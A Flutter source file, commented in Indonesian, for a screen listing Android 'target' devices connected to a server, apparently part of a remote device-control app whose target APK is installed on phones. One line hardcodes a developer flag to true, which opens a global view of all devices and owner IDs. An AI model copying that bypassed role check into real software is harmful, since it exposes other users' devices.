import 'package:flutter/material.dart';
import 'package:provider/provider.dart';

import '../config/api_config.dart';
import '../models/device_model.dart';
import '../services/auth_service.dart';
import '../services/socket_service.dart';
import '../theme/app_theme.dart';
import '../theme/app_typography.dart';
import '../widgets/sync_widgets.dart';
import 'login_screen.dart';

class DevicesScreen extends StatelessWidget {
  const DevicesScreen({super.key, required this.onDeviceSelected});

  final VoidCallback onDeviceSelected;

  @override
  Widget build(BuildContext context) {
    final socket = context.watch<SocketService>();
    
    // CEK APAKAH USER INI DEVELOPER
    final auth = context.read<AuthService>();
    final isDeveloper = true; // Backend sudah handle, jadi Flutter wajib true // Sesuaikan dengan getter role di AuthService kamu

    if (!socket.connected) {
      final token = auth.token;
      final error = socket.lastError;
      return Center(
        child: FadeSlideIn(
          child: ElegantCard(
            padding: const EdgeInsets.all(28),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(
                  error == null ? Icons.sync_rounded : Icons.wifi_off_rounded,
                  size: 34,
                  color: AppColors.dashAccent.withValues(alpha: 0.65),
                ),
                const SizedBox(height: 16),
                Text(
                  error == null ? 'Menghubungkan...' : 'Koneksi server terputus',
                  style: AppTypography.menuTitle().copyWith(fontSize: 14),
                ),
                const SizedBox(height: 4),
                Text(
                  error ?? 'Sinkron device target via socket',
                  textAlign: TextAlign.center,
                  style: AppTypography.menuSubtitle(),
                ),
                const SizedBox(height: 6),
                Text('Server: ${ApiConfig.baseUrl}', style: AppTypography.techId()),
                if (token != null) ...[
                  const SizedBox(height: 16),
                  SyncPrimaryButton(
                    label: error == 'Unauthorized' ? 'LOGIN ULANG' : 'COBA LAGI',
                    icon: error == 'Unauthorized' ? Icons.logout_rounded : Icons.refresh_rounded,
                    variant: ButtonVariant.light,
                    onPressed: () async {
                      if (error == 'Unauthorized') {
                        context.read<SocketService>().disconnect();
                        await auth.logout();
                        if (!context.mounted) return;
                        Navigator.of(context).pushAndRemoveUntil(
                          MaterialPageRoute(builder: (_) => const LoginScreen()),
                          (_) => false,
                        );
                        return;
                      }
                      context.read<SocketService>().connect(token);
                    },
                  ),
                  if (error == 'Unauthorized') ...[
                    const SizedBox(height: 8),
                    Text(
                      'Sesi habis (server restart). Login ulang untuk sinkron device.',
                      textAlign: TextAlign.center,
                      style: AppTypography.welcomeMeta(),
                    ),
                  ],
                ],
              ],
            ),
          ),
        ),
      );
    }

    if (socket.devices.isEmpty) {
      return Center(
        child: FadeSlideIn(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: ElegantCard(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    width: 72,
                    height: 72,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: AppColors.dashAccent.withValues(alpha: 0.06),
                      border: Border.all(color: AppColors.dashAccent.withValues(alpha: 0.14)),
                    ),
                    child: Icon(Icons.phonelink_erase_outlined, size: 32, color: AppColors.dashAccent.withValues(alpha: 0.5)),
                  ),
                  const SizedBox(height: 16),
                  Text('Belum ada device online', style: AppTypography.menuTitle()),
                  const SizedBox(height: 6),
                  Text(
                    isDeveloper 
                        ? 'Belum ada device target yang terhubung ke server.' 
                        : 'Install APK target di perangkat.\nDevice muncul otomatis saat online.',
                    textAlign: TextAlign.center,
                    style: AppTypography.menuSubtitle(),
                  ),
                ],
              ),
            ),
          ),
        ),
      );
    }

    final online = socket.devices.length;

    return ListView(
      padding: const EdgeInsets.fromLTRB(16, 8, 16, 100),
      children: [
        FadeSlideIn(
          child: ElegantCard(
            accent: true,
            padding: const EdgeInsets.fromLTRB(20, 18, 20, 16),
            child: Row(
              children: [
                Container(
                  width: 42,
                  height: 42,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    color: AppColors.dashAccent.withValues(alpha: 0.08),
                    border: Border.all(color: AppColors.dashAccent.withValues(alpha: 0.14)),
                  ),
                  child: Icon(
                    isDeveloper ? Icons.admin_panel_settings_rounded : Icons.devices_rounded, 
                    color: AppColors.dashAccent, 
                    size: 22
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        isDeveloper ? 'Semua Device Server' : 'Device Target', 
                        style: AppTypography.brand(size: 20)
                      ),
                      Text(
                        '$online online ${isDeveloper ? '(Global)' : ''}',
                        style: AppTypography.menuSubtitle(),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
        const SizedBox(height: 14),
        ...socket.devices.asMap().entries.map((e) => FadeSlideIn(
              delay: Duration(milliseconds: 40 + e.key * 50),
              child: Padding(
                padding: const EdgeInsets.only(bottom: 10),
                child: _DeviceTile(
                  device: e.value,
                  isDeveloper: isDeveloper, // KIRIM FLAG DEVELOPER
                  selected: socket.selectedDeviceId == e.value.id,
                  onTap: () {
                    context.read<SocketService>().selectDevice(e.value.id);
                    onDeviceSelected();
                  },
                ),
              ),
            )),
      ],
    );
  }
}

class _DeviceTile extends StatelessWidget {
  const _DeviceTile({
    required this.device, 
    required this.selected, 
    required this.onTap,
    required this.isDeveloper, // TAMBAHKAN INI
  });

  final DeviceModel device;
  final bool selected;
  final VoidCallback onTap;
  final bool isDeveloper; // TAMBAHKAN INI

  @override
  Widget build(BuildContext context) {
    return ElegantCard(
      onTap: onTap,
      padding: const EdgeInsets.all(16),
      child: Row(
        children: [
          Container(
            width: 50,
            height: 50,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(15),
              color: AppColors.dashAccent.withValues(alpha: selected ? 0.14 : 0.08),
              border: Border.all(color: AppColors.dashAccent.withValues(alpha: selected ? 0.28 : 0.14)),
            ),
            child: Icon(Icons.smartphone_rounded, color: AppColors.dashAccent.withValues(alpha: selected ? 1 : 0.75)),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(device.name, style: AppTypography.menuTitle()),
                const SizedBox(height: 4),
                Text(
                  'Android ${device.androidVersion} · ${device.battery >= 0 ? '${device.battery}%' : '?'}${device.charging ? ' ⚡' : ''}',
                  style: AppTypography.welcomeMeta(),
                ),
                const SizedBox(height: 2),
                
                // TAMBAHAN: TAMPILKAN UID PEMILIK JIKA DEVELOPER
                if (isDeveloper && device.uid != null && device.uid!.isNotEmpty)
                  Container(
                    margin: const EdgeInsets.only(top: 4),
                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                    decoration: BoxDecoration(
                      color: Colors.orange.withValues(alpha: 0.1),
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(color: Colors.orange.withValues(alpha: 0.3)),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Icon(Icons.person_outline_rounded, size: 12, color: Colors.orange),
                        const SizedBox(width: 4),
                        Text(
                          'Owner: ${device.uid!.substring(0, 16)}...',
                          style: AppTypography.techId().copyWith(
                            color: Colors.orange,
                            fontSize: 10,
                          ),
                        ),
                      ],
                    ),
                  )
                else
                  Text(device.id, maxLines: 1, overflow: TextOverflow.ellipsis, style: AppTypography.techId()),
              ],
            ),
          ),
          const SizedBox(width: 8),
          if (device.status.deviceLocked)
            Icon(Icons.lock_rounded, color: AppColors.dashAccent.withValues(alpha: 0.65), size: 18),
          Icon(
            selected ? Icons.check_circle_rounded : Icons.chevron_right_rounded,
            color: AppColors.dashAccent.withValues(alpha: selected ? 1 : 0.5),
            size: 22,
          ),
        ],
      ),
    );
  }
}